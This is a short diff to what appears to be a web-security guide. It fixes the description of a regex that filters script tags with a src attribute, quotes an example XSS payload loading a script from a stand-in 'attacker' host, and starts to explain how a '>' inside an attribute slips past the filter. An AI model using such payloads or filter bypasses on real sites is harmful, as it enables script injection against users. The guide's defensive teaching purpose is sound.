@@ -166,7 +166,7 @@ Decoupling the above regular expression:
 
 1. Check for a `<script`
 2. Check for a " " (white space)
-3. Any character but the character `^` for one or more occurrences
+3. Any character but the character `>` for one or more occurrences
 4. Check for a `src`
 
 This is useful for filtering expressions like `<script src="http://attacker/xss.js"></script>` which is a common attack. But, in this case, it is possible to bypass the sanitization by using the `>` character in an attribute between script and src, like this:
